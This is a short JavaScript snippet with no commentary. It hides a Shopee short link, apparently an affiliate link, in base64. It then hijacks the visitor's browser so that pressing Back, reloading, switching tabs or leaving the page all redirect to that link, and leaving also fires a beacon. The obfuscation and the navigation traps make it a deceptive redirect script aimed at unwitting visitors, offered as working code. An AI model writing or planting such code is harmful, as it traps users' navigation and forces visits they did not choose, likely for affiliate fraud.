(function(){
    const u="aHR0cHM6Ly9zLnNob3BlZS5jby5pZC9BS2NSM2xqeW1S";
    const d=atob(u);
    const r=function(){window.location.href=d};

    history.pushState({m:1},"",window.location.href);
    window.addEventListener("popstate",function(){
        r();
    });

    try{
        var n=performance.getEntriesByType("navigation")[0];
        if(n&&n.type==="reload"){
            r();
        }
    }catch(e){
        if(performance.navigation.type===performance.navigation.TYPE_RELOAD){
            r();
        }
    }

    var f=true;

    document.addEventListener("visibilitychange",function(){
        if(document.visibilityState==="hidden"&&f){
            setTimeout(function(){
                r();
            },60);
        }
    });

    window.addEventListener("beforeunload",function(){
        if(f){
            navigator.sendBeacon("/","x");
            r();
        }
    });
})();
